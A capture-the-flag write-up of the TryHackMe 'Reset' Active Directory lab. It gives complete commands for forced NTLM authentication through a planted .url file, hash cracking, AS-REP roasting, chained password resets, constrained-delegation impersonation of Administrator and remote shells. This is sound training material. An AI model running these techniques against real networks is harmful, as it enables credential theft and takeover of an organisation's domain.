---
title: 'TryHackMe: Reset'
author: jaxafed
categories: [TryHackMe]
tags: [smb, ntlm_theft, bloodhound, windows, active directory, domain, constrained delegation]
render_with_liquid: false
media_subpath: /images/tryhackme_reset/
image:
  path: room_image.webp
---

After capturing a user's hash with forced authentication by uploading a malicious file to a SMB share, we were able to crack the hash and get a set of credentials. Using these credentials to enumerate the Active Directory, there were some AS-REP Roastable users. Performing AS-REP Roast to get the hash for these users, we were successful in cracking one of the hashes and got another set of credentials. We reset the passwords of several accounts in a sequence using the newly discovered credentials in order to get to an account with constrained delegation rights. Impersonating the Administrator user with constrained delegation, we got a shell as Administrator.

![Tryhackme Room Link](room_card.webp){: width="600" height="150" .shadow }
_<https://tryhackme.com/room/resetui>_

## Initial enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.220.239
Nmap scan report for 10.10.220.239
Host is up (0.081s latency).
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-26 23:45:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-01-26T23:47:23+00:00; +5s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2024-01-26T23:46:43+00:00
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2024-01-25T21:01:31
|_Not valid after:  2024-07-26T21:01:31
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

```

From the NMAP scan, it seems we are dealing with a DC.

Adding `haystack.thm.corp` and `thm.corp` to `/etc/hosts` file.

### SMB

Using `crackmapexec` to enumerate the SMB, we see it accepts anonymous logins.

```console
$ cme smb 10.10.220.239 -u 'anonymous' -p '' --shares                                          
SMB         10.10.220.239   445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         10.10.220.239   445    HAYSTACK         [+] thm.corp\anonymous: 
SMB         10.10.220.239   445    HAYSTACK         [+] Enumerated shares
SMB         10.10.220.239   445    HAYSTACK         Share           Permissions     Remark
SMB         10.10.220.239   445    HAYSTACK         -----           -----------     ------
SMB         10.10.220.239   445    HAYSTACK         ADMIN$                          Remote Admin
SMB         10.10.220.239   445    HAYSTACK         C$                              Default share
SMB         10.10.220.239   445    HAYSTACK         Data            READ,WRITE      
SMB         10.10.220.239   445    HAYSTACK         IPC$            READ            Remote IPC
SMB         10.10.220.239   445    HAYSTACK         NETLOGON                        Logon server share 
SMB         10.10.220.239   445    HAYSTACK         SYSVOL                          Logon server share 
```

We have read permission to `IPC$`, which we will use in the alternative way, and read, write permissions to `Data`.

Using `smbclient` to connect to the share.

```console
$ smbclient -U 'anonymous'%'' '\\10.10.220.239\Data'                            
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan 26 23:56:56 2024
  ..                                  D        0  Fri Jan 26 23:56:56 2024
  onboarding                          D        0  Fri Jan 26 23:58:05 2024

                7863807 blocks of size 4096. 2987822 blocks available
smb: \> dir onboarding
  onboarding                          D        0  Fri Jan 26 23:58:35 2024

                7863807 blocks of size 4096. 2987758 blocks available
smb: \> dir onboarding\
  .                                   D        0  Fri Jan 26 23:58:35 2024
  ..                                  D        0  Fri Jan 26 23:58:35 2024
  2itkysfd.kd4.txt                    A      521  Mon Aug 21 19:21:59 2023
  hqivio5i.k3x.pdf                    A  3032659  Mon Jul 17 09:12:09 2023
  rnfma3zy.ms2.pdf                    A  4700896  Mon Jul 17 09:11:53 2023

                7863807 blocks of size 4096. 2987758 blocks available
```

We notice that the files in the share are constantly changing.

```console
smb: \> dir onboarding\
  .                                   D        0  Fri Jan 26 23:59:35 2024
  ..                                  D        0  Fri Jan 26 23:59:35 2024
  kcx1ybn2.geq.pdf                    A  4700896  Mon Jul 17 09:11:53 2023
  pmojorqn.2xj.pdf                    A  3032659  Mon Jul 17 09:12:09 2023
  vc4il3jf.h0f.txt                    A      521  Mon Aug 21 19:21:59 2023

                7863807 blocks of size 4096. 2987708 blocks available
```

## Shell as automate

### Forced authentication to capture the hash

Since we know there is activity in the share, we can try dropping a file to the share that will force the user to authenticate to our server when a user browses the share.

Using [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) to create a malicious `.url` file.

```console
$ python3 ntlm_theft.py -g url -s 10.11.63.57 -f test
Created: test/test-(url).url (BROWSE TO FOLDER)
Created: test/test-(icon).url (BROWSE TO FOLDER)
Generation Complete.
```

Running responder to spin up a server that will respond to the authentication requests made.
```console
$ sudo responder -I tun0
```

Uploading the generated file to the `\Data\onboarding` share.

```console
smb: \> cd onboarding\
smb: \onboarding\> put "test-(icon).url"
putting file test-(icon).url as \onboarding\test-(icon).url (0.4 kb/s) (average 0.3 kb/s)
```

After some time, we get the hash for `automate`.
```console
[SMB] NTLMv2-SSP Client   : 10.10.220.239
[SMB] NTLMv2-SSP Username : THM\AUTOMATE
[SMB] NTLMv2-SSP Hash     : AUTOMATE::THM:[REDACTED]
```
### Cracking the hash

Using `john` to crack the captured hash, we get the password for `automate`.

```console
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                       
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]        (AUTOMATE)     
1g 0:00:00:00 DONE (2024-01-27 00:13) 2.040g/s 463934p/s 463934c/s 463934C/s SOCCER2..920227
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

### Using evil-winrm to get a shell

Using the credentials we have, we can use `evil-winrm` to get a shell and read the user flag.

```console
$ evil-winrm -i haystack.thm.corp -u 'automate' -p '[REDACTED]'
*Evil-WinRM* PS C:\Users\automate\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\automate\Desktop> dir


    Directory: C:\Users\automate\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        6/16/2023   4:35 PM             31 user.txt

```

## Access as tabatha_britt

### Enumeration with BloodHound

Apart from getting a shell with the credentials we have, we can also use them to collect `BloodHound` data.

I will use [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) for this.

```console
$ bloodhound-python -ns 10.10.220.239 --dns-tcp -d THM.CORP -u 'automate' -p '[REDACTED]' -c All --zip
INFO: Found AD domain: thm.corp
INFO: Getting TGT for user
INFO: Connecting to LDAP server: haystack.thm.corp
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: haystack.thm.corp
INFO: Found 42 users
INFO: Found 55 groups
INFO: Found 3 gpos
INFO: Found 222 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: HayStack.thm.corp
INFO: Done in 00M 47S
INFO: Compressing output into 20240127002200_bloodhound.zip
```

### AS-REP Roasting

Uploading the collected data to `Bloodhound`.

Checking for AS-REP Roastable users, there are three.

![AS-REP Roastable users](ASREPRoastableUsers.webp){: width="850" height="450" }

- ERNESTO_SILVA@THM.CORP
- TABATHA_BRITT@THM.CORP
- LEANN_LONG@THM.CORP

Using impacket's `GetNPUsers.py` to request a tgt for the users.

```console
$ GetNPUsers.py -request -format john -no-pass thm.corp/ERNESTO_SILVA
$ GetNPUsers.py -request -format john -no-pass thm.corp/TABATHA_BRITT
$ GetNPUsers.py -request -format john -no-pass thm.corp/LEANN_LONG
```

Using `john` to crack the hashes we got, we get a password for `TABATHA_BRITT`.

```console
$ john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]   ($krb5asrep$TABATHA_BRITT@THM.CORP)     
1g 0:00:01:40 DONE (2024-01-27 00:38) 0.009928g/s 142412p/s 342065c/s 342065C/s  0841079575..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## Shell as Administrator

### More enumeration with Bloodhound

Checking the rights for `TABATHA_BRITT`, we notice a chain of rights leading up to `DARLA_WINTERS`.

![BloodHound Enumeration](BloodhoundEnum.webp){: width="700" height="250" }

### Resetting the passwords

Since `TABATHA_BRITT` has `GenericAll` for `SHAWNA_BRAY`, we can use this to reset the password for `SHAWNA_BRAY`.

Using `net rpc` to achieve this.

```console
$ net rpc password "SHAWNA_BRAY" "NewPassword123@" -U "THM.CORP"/"TABATHA_BRITT"%"[REDACTED]" -S "haystack.thm.corp"
```

Testing the password change using `crackmapexec`, it was a success.

```console
$ cme smb haystack.thm.corp -u 'SHAWNA_BRAY' -p 'NewPassword123@'
SMB         haystack.thm.corp 445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         haystack.thm.corp 445    HAYSTACK         [+] thm.corp\SHAWNA_BRAY:NewPassword123@
```

Continuing up the chain, user `SHAWNA_BRAY` has `ForceChangePassword` right for `CRUZ_HALL`.

We can use the same method to reset the password for `CRUZ_HALL`.

```console
$ net rpc password "CRUZ_HALL" "NewPassword123@" -U "THM.CORP"/"SHAWNA_BRAY"%"NewPassword123@" -S "haystack.thm.corp"
```

Testing the password change once again.

```console
$ cme smb haystack.thm.corp -u 'CRUZ_HALL' -p 'NewPassword123@'                                        
SMB         haystack.thm.corp 445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         haystack.thm.corp 445    HAYSTACK         [+] thm.corp\CRUZ_HALL:NewPassword123@
```

User `CRUZ_HALL` has `GenericWrite` on `DARLA_WINTERS`.

We will use the same method of resetting password for the last time.

```console
$ net rpc password "DARLA_WINTERS" "NewPassword123@" -U "THM.CORP"/"CRUZ_HALL"%"NewPassword123@" -S "haystack.thm.corp"
```

Now, we have access as `DARLA_WINTERS`.

```console
$ cme smb haystack.thm.corp -u 'DARLA_WINTERS' -p 'NewPassword123@'                                                    
SMB         haystack.thm.corp 445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         haystack.thm.corp 445    HAYSTACK         [+] thm.corp\DARLA_WINTERS:NewPassword123@ 
```

### Constrained Delegation

Checking the user `DARLA_WINTERS` on BloodHound, we see that the user is able to perform `constrained delegation`.

![Constrained Delegation on BloodHound](ConstrainedDelegation.webp){: width="800" height="650" }

This means we can impersonate Administrator for the `CIFS` service on the Domain Controller (haystack.thm.corp).

> Since we will be using Kerberos from this point on, you have to make sure the attacker machine's time is synched with the DC.
{: .prompt-tip }

Using impacket's `getST.py` for this.

```console
$ getST.py -spn "cifs/haystack.thm.corp" -impersonate "Administrator" "thm.corp/DARLA_WINTERS:NewPassword123@"
Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

### Getting a shell

Setting the ccache using the `KRB5CCNAME` environment variable.

```console
export KRB5CCNAME=Administrator.ccache
```

Now we can use `wmiexec.py` with Kerberos authentication to get a shell as `Administrator` and read the root flag.

```console
$ wmiexec.py -k -no-pass Administrator@haystack.thm.corp
Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
thm\administrator

C:\>dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

07/14/2023  07:23 AM    <DIR>          .
07/14/2023  07:23 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/16/2023  04:37 PM                30 root.txt
               3 File(s)          1,111 bytes
               2 Dir(s)  12,239,609,856 bytes free
```

## Alternative way of getting user

### RID Bruteforce to discover usernames

Since anonymous users have read access to the `IPC$` share on SMB, we can use this to enumerate users with RID bruteforce.

```console
$ cme smb haystack.thm.corp -u 'anonymous' -p '' --rid-brute 1500
...
SMB         haystack.thm.corp 445    HAYSTACK         1111: THM\3091731410SA (SidTypeUser)
SMB         haystack.thm.corp 445    HAYSTACK         1112: THM\ERNESTO_SILVA (SidTypeUser)
SMB         haystack.thm.corp 445    HAYSTACK         1113: THM\TRACY_CARVER (SidTypeUser)
SMB         haystack.thm.corp 445    HAYSTACK         1114: THM\SHAWNA_BRAY (SidTypeUser)
...
SMB         haystack.thm.corp 445    HAYSTACK         1147: THM\AUGUSTA_HAMILTON (SidTypeUser)
SMB         haystack.thm.corp 445    HAYSTACK         1148: THM\TREVOR_MELTON (SidTypeUser)
SMB         haystack.thm.corp 445    HAYSTACK         1149: THM\LEANN_LONG (SidTypeUser)
SMB         haystack.thm.corp 445    HAYSTACK         1150: THM\RAQUEL_BENSON (SidTypeUser)
...
```
Creating a list of valid usernames.

```console
$ cme smb haystack.thm.corp -u 'anonymous' -p '' --rid-brute 1500 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 > valid_usernames.txt
```

### AS-REP Roast

With a list of valid usernames, we can test them for AS-REP Roast.

```console
$ GetNPUsers.py -request -format john -usersfile valid_usernames.txt thm.corp/

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
...
$krb5asrep$ERNESTO_SILVA@THM.CORP:[REDACTED]
...
$krb5asrep$TABATHA_BRITT@THM.CORP:[REDACTED]
...
$krb5asrep$LEANN_LONG@THM.CORP:[REDACTED]
...
```

Cracking the hashes, we get the password for `TABATHA_BRITT`.

### Finding credentials for automate

As `TABATHA_BRITT`, we can get access to the machine using `RDP` and find the autologon credentials for `automate` inside `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` registry.

![WinLogon Credentials for automate](WinLogonCredentials.webp){: width="800" height="200" }